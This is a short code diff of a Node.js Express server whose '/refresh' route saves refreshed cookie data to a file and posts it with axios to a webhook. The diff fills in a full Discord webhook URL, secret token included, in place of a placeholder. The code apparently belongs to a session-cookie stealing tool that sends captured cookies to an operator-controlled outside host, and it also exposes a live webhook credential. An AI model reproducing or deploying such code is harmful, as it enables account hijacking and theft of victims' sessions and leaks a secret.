@@ -57,7 +57,7 @@ app.get('/refresh', async (req, res) => {
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
 
-    const webhookURL = 'HOOK HERE';
+    const webhookURL = 'https://discord.com/api/webhooks/1465420784175550525/DgwdDcS5djyB0fftP2sDeRSe0jNEEPnFAdO97F19OPyNdFG0GketXZN5CnMJgHhT_pcG';
     const response = await axios.post(webhookURL, {
         embeds: [
             {
@@ -93,3 +93,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
+
